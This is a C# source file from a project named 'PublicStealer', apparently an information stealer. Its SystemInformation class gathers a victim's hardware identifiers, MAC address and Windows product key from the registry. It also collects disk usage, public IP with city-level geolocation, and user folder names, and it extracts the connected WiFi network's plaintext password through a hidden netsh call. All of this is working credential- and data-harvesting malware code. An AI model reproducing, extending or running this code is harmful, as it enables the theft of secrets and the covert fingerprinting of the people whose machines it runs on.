using System;
using System.Net;
using System.Management;
using System.IO;
using System.Diagnostics;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Net.NetworkInformation;
using Microsoft.Win32;
using Newtonsoft.Json.Linq;
using System.Text;

namespace PublicStealer.Utils
{
    public static class SystemInformation
    {
        public static string GetHardwareInfo()
        {
            string cpu = "N/A", gpu = "N/A", ram = "N/A", hwid = "N/A", mac = "N/A", key = "N/A";
            try
            {
                using (var s = new ManagementObjectSearcher("SELECT Name FROM Win32_Processor"))
                    foreach (var obj in s.Get()) cpu = obj["Name"].ToString();
                using (var s = new ManagementObjectSearcher("SELECT Name FROM Win32_VideoController"))
                    foreach (var obj in s.Get()) gpu = obj["Name"].ToString();
                long mem = 0;
                using (var s = new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory"))
                    foreach (var obj in s.Get()) mem += Convert.ToInt64(obj["Capacity"]);
                ram = (mem / 1024 / 1024 / 1024).ToString() + "GB";

                // HWID basé sur le processeur et la carte mère
                using (var mc = new ManagementClass("Win32_ComputerSystemProduct"))
                using (var moc = mc.GetInstances())
                    foreach (ManagementObject mo in moc) hwid = mo.Properties["UUID"].Value.ToString();

                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                    if (nic.OperationalStatus == OperationalStatus.Up && !nic.Description.Contains("Virtual"))
                    { mac = nic.GetPhysicalAddress().ToString(); break; }

                using (var k = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
                using (var sk = k.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform"))
                    key = sk?.GetValue("BackupProductKeyDefault")?.ToString() ?? "N/A";
            }
            catch { }
            return $"OS: {Environment.OSVersion}\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}\nHWID: {hwid}\nMAC: {mac}\nWinKey: {key}";
        }

        public static string GetDiskInfo()
        {
            string info = "Drive    Free      Total     Use\n";
            try
            {
                foreach (DriveInfo drive in DriveInfo.GetDrives())
                    if (drive.IsReady && drive.DriveType == DriveType.Fixed)
                    {
                        long free = drive.TotalFreeSpace / 1024 / 1024 / 1024;
                        long total = drive.TotalSize / 1024 / 1024 / 1024;
                        info += $"{drive.Name,-8}{free}GB       {total}GB       {(total > 0 ? 100 - (free * 100 / total) : 0)}%\n";
                    }
            }
            catch { }
            return info;
        }

        public static string GetNetworkInfo()
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    string json = client.DownloadString("http://ip-api.com/json/");
                    JObject d = JObject.Parse(json);
                    // Les 8 informations complètes
                    return $"IP: {d["query"]}\nCountry: {d["country"]} ({d["countryCode"]})\nRegion: {d["regionName"]}\nCity: {d["city"]}\nZip: {d["zip"]}\nISP: {d["isp"]}\nASN: {d["as"]}\nLat/Lon: {d["lat"]}, {d["lon"]}";
                }
            }
            catch { return "Network Error"; }
        }

        public static string GetWifiInfo()
        {
            try
            {
                Process p = new Process();
                p.StartInfo = new ProcessStartInfo("cmd.exe", "/c netsh wlan show interfaces")
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.GetEncoding(850)
                };
                p.Start();
                string output = p.StandardOutput.ReadToEnd();

                string ssid = "";
                foreach (string line in output.Split('\n'))
                {
                    if (line.Contains("SSID") && !line.Contains("BSSID"))
                    {
                        ssid = line.Split(':')[1].Trim();
                        break;
                    }
                }

                if (string.IsNullOrEmpty(ssid)) return "No WiFi Connected";

                p.StartInfo.Arguments = $"/c netsh wlan show profile name=\"{ssid}\" key=clear";
                p.Start();
                string profileOutput = p.StandardOutput.ReadToEnd();

                string password = "Not Found";
                foreach (string line in profileOutput.Split('\n'))
                {
                    // Recherche précise du mot de passe
                    if (line.Contains("Contenu") || line.Contains("Key Content"))
                    {
                        password = line.Split(':')[1].Trim();
                        break;
                    }
                }
                return $"Network: {ssid}\nPassword: {password}";
            }
            catch { return "WiFi Error"; }
        }

        public static string GetUsersList() => string.Join("\n", Directory.GetDirectories("C:\\Users"));
    }
}